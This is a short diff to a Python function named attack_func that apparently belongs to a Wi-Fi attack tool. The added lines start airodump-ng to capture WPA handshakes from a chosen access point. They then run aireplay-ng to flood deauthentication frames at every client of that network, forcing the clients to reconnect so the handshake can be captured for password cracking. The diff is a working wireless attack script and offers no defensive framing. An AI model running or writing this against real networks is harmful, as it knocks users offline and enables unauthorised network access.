@@ -83,6 +83,11 @@ def attack_func(network_interface, attack_mode):
     if airodump_pid.stdout != "0":
             os.system(f"sudo kill {airodump_pid.stdout}")
     time.sleep(1)
+    os.system(f"xterm -hold -e airodump-ng -c {access_point_channel} -w HandShake-Capture/Capture --essid {access_point_name} {network_interface}mon &")
+    time.sleep(4)
+    os.system(f"xterm -hold -e aireplay-ng -0 12 -e {access_point_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
+    aireplay_pid = subprocess.run(["pgrep", "xterm"], capture_output=True, text=True)
+    time.sleep(40)
 
 
 
